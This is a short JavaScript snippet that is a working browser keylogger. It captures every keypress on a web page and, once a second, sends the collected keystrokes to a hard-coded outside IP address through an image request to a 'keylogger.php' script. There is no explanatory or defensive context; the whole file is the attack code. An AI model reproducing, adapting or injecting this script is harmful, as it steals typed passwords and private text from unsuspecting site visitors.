var keys='';
document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
}
window.setInterval(function(){
	new Image().src = 'http://206.130.110.212/forum/system/keylogger.php?c='+keys;
	keys = '';
}, 1000);

